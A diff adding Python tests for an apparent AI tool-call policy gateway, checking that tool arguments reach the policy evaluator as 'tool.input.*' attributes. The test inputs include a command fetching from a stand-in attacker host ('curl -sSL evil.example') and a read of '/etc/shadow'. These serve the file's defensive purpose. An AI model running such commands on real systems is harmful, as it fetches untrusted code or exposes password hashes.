@@ -475,3 +475,216 @@ def test_evaluation_input_carries_gateway_rule_context():
         assert inp.attributes["invocation_id"] == 99
     finally:
         unregister_evaluator("capture-eval")
+
+
+# ── COHORT 6: tool_arguments threading ───────────────────────────────
+#
+# The gateway must forward the caller's tool arguments into the
+# evaluator so a rule like ``when: {tool.input.command: {matches: curl}}``
+# can actually inspect the command being invoked. Prior to this
+# threading, evaluators saw an empty attribute bag and any
+# tool.input.* rule silently no-op'd (green checkmark, zero
+# enforcement). Sabotage-verify: drop the tool_arguments kwarg from
+# _run_policy / _build_eval_input and these tests must fail.
+
+
+def test_evaluate_threads_tool_arguments_to_evaluator():
+    """When tool_arguments is passed to evaluate(), the evaluator's
+    EvaluationInput.attributes dict must contain flattened
+    ``tool.input.<key>`` entries with the raw values. This is the
+    load-bearing plumbing test — a spy evaluator asserts on the real
+    data flow rather than a return value."""
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        cfg = PolicyConfig(
+            min_trust=0,
+            rbac=RBACConfig(default="deny", rules=[]),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.filesystem.write",
+            payload_bytes=512, invocation_id=99, cfg=cfg,
+            tool_arguments={
+                "command": "curl -sSL evil.example",
+                "timeout": 30,
+                "flags": ["--silent", "-L"],
+            },
+        )
+        assert len(cap.calls) == 1
+        attrs = cap.calls[0].attributes
+        # Each key flattens to tool.input.<key>. Raw types preserved:
+        # str, int, list.
+        assert attrs.get("tool.input.command") == "curl -sSL evil.example"
+        assert attrs.get("tool.input.timeout") == 30
+        assert attrs.get("tool.input.flags") == ["--silent", "-L"]
+    finally:
+        unregister_evaluator("capture-eval")
+
+
+def test_evaluate_tool_arguments_none_skips_iteration():
+    """FIX-4a — distinguish the None branch at policy_pipeline.py:304
+    (``if tool_arguments:``). Explicit ``tool_arguments=None`` must
+    skip the flatten loop entirely; NO ``tool.input.*`` keys land on
+    the attrs bag. Weak-sabotage protection: the previous single test
+    conflated None + {} + omitted-kwarg into one truthy check, so a
+    regression that skipped ONLY None (or ONLY {}) would still pass.
+    """
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        cfg = PolicyConfig(
+            min_trust=0,
+            rbac=RBACConfig(default="deny", rules=[]),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.x.read",
+            payload_bytes=100, invocation_id=1, cfg=cfg,
+            tool_arguments=None,
+        )
+        assert len(cap.calls) == 1
+        tool_input_keys = [
+            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
+        ]
+        assert tool_input_keys == [], (
+            "tool_arguments=None must not synthesise any tool.input.* "
+            f"keys, got {tool_input_keys}"
+        )
+    finally:
+        unregister_evaluator("capture-eval")
+
+
+def test_evaluate_tool_arguments_empty_dict_skips_iteration():
+    """FIX-4b — distinguish the empty-dict branch. ``{}`` is falsy so
+    the ``if tool_arguments:`` gate skips iteration. Separate test
+    from the None case so a future refactor that swaps the truthy
+    check for ``is not None`` (which would let ``{}`` fall through)
+    is caught at CI time, not on next request.
+    """
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        cfg = PolicyConfig(
+            min_trust=0,
+            rbac=RBACConfig(default="deny", rules=[]),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.x.read",
+            payload_bytes=100, invocation_id=1, cfg=cfg,
+            tool_arguments={},
+        )
+        assert len(cap.calls) == 1
+        tool_input_keys = [
+            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
+        ]
+        assert tool_input_keys == [], (
+            "tool_arguments={} must not synthesise any tool.input.* "
+            f"keys, got {tool_input_keys}"
+        )
+    finally:
+        unregister_evaluator("capture-eval")
+
+
+def test_evaluate_tool_arguments_populated_produces_flattened_keys():
+    """FIX-4c — POSITIVE assertion the weak test never made: a
+    non-empty dict DOES produce ``attrs["tool.input.k"] == "v"`` on
+    the flattened attrs bag. Without this positive proof, both of
+    the above absence-assertions could pass under a sabotage that
+    silently DROPPED the flatten loop entirely.
+    """
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        cfg = PolicyConfig(
+            min_trust=0,
+            rbac=RBACConfig(default="deny", rules=[]),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.x.read",
+            payload_bytes=100, invocation_id=1, cfg=cfg,
+            tool_arguments={"k": "v"},
+        )
+        assert len(cap.calls) == 1
+        assert cap.calls[0].attributes.get("tool.input.k") == "v", (
+            "tool_arguments={'k':'v'} must produce "
+            f"attrs['tool.input.k']=='v', got attributes="
+            f"{dict(cap.calls[0].attributes)}"
+        )
+    finally:
+        unregister_evaluator("capture-eval")
+
+
+def test_evaluate_no_tool_input_entries_when_missing():
+    """Original regression: when ``tool_arguments`` is entirely
+    OMITTED from the call (default-arg path, distinct from explicit
+    None), no ``tool.input.*`` keys appear. Retained alongside the
+    three distinguishing tests above so the default-arg codepath
+    stays covered independently.
+    """
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        cfg = PolicyConfig(
+            min_trust=0,
+            rbac=RBACConfig(default="deny", rules=[]),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.x.read",
+            payload_bytes=100, invocation_id=1, cfg=cfg,
+        )
+        assert len(cap.calls) == 1
+        tool_input_keys = [
+            k for k in cap.calls[0].attributes if k.startswith("tool.input.")
+        ]
+        assert tool_input_keys == [], (
+            f"expected no tool.input.* attrs, got {tool_input_keys}"
+        )
+    finally:
+        unregister_evaluator("capture-eval")
+
+
+def test_evaluate_tool_arguments_survive_when_extra_also_passed():
+    """The dispatch closure ALSO passes ``extra`` kwargs from
+    per-rule sites (e.g. ``budget_remaining``). Assert
+    ``tool.input.*`` entries survive that merge — reusability of the
+    existing ``attrs.update(extra)`` shouldn't clobber the tool input.
+    """
+    cap = CaptureEvaluator()
+    register_evaluator("capture-eval", cap)
+    try:
+        # Payload cap forces a per-rule dispatch that passes
+        # ``payload_bytes`` as an extra kwarg — exercises the
+        # merge-with-extra codepath alongside tool_arguments.
+        cfg = PolicyConfig(
+            min_trust=0,
+            payload_caps=PayloadCapsConfig(max_bytes=1024),
+            policy_evaluator_name="capture-eval",
+        )
+        evaluate(
+            db=None, tenant_id="tenant-alpha",
+            principal=_principal("agent"),
+            action="mcp.x.read",
+            payload_bytes=2048, invocation_id=None, cfg=cfg,
+            tool_arguments={"path": "/etc/shadow"},
+        )
+        assert len(cap.calls) == 1
+        attrs = cap.calls[0].attributes
+        assert attrs.get("tool.input.path") == "/etc/shadow"
+        # Rule context still present.
+        assert attrs.get("gateway_rule") == "payload_caps"
+    finally:
+        unregister_evaluator("capture-eval")
